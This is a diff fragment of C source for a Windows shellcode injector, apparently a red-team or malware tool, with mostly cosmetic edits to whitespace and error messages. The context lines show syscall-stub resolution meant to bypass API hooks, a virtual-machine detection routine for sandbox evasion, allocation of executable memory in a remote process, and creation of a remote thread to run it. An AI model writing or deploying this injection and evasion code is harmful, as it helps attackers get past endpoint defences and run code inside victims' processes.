@@ -9,7 +9,6 @@ Compile w/
 
 gcc -s -fmerge-all-constants <> stubs.o -o injector.exe
 */
-
 DWORD g_SSN_NtAllocateVirtualMemory = 0;
 PVOID g_Stub_NtAllocateVirtualMemory = NULL;
 DWORD g_SSN_NtWriteVirtualMemory = 0;
@@ -101,7 +100,7 @@ FARPROC __stdcall MyGetProcAddress(HMODULE hModule, LPCSTR lpProcName) {
     return NULL;
 }
 
-_SYSCALL_STUB getDirectSyscallStub(HMODULE hNTDLL, PUCHAR NtFunctionName){
+_SYSCALL_STUB getDirectSyscallStub(HMODULE hNTDLL, PUCHAR NtFunctionName) {
     SYSCALL_STUB stub = { 0 };
     PVOID NtFunctionAddr = (PVOID)MyGetProcAddress(hNTDLL, (LPCSTR)NtFunctionName);
     if (!NtFunctionAddr) return stub;
@@ -149,6 +148,7 @@ BOOL isWow64(HANDLE hProcess) {
 
     return bIsWow64;
 }
+
 
 int vmDetect(){
     /*
@@ -281,7 +281,7 @@ Resolved functions : \n \
     _stub_NtAllocateVirtualMemory(hProcess, &memPoolPtr, 0, &scSize, (ULONG)(MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE);
 
     if (memPoolPtr == NULL) {
-	    printf("VirtualAllocEx failed: %ul\n", GetLastError());
+	    printf("Indirect sycall for page alloc failed: %ul\n", GetLastError());
 	    return 1;
     }
     printf("[+] Mem page allocated at: 0x%p\n", memPoolPtr);
@@ -301,7 +301,7 @@ Resolved functions : \n \
     ACCESS_MASK acc  = THREAD_ALL_ACCESS;
     _stub_NtCreateThreadEx(&hThread, 0x1FFFFF, NULL, hProcess, (LPTHREAD_START_ROUTINE)memPoolPtr, NULL, FALSE, NULL, NULL, NULL, NULL);
     if (hThread == NULL) {
-        printf("CreateRemoteThread failed : %ul\n", GetLastError());
+        printf("Create thread on remote proc failed : %ul\n", GetLastError());
         return 1;
     }
     printf("[+] Remote thread created.\n");
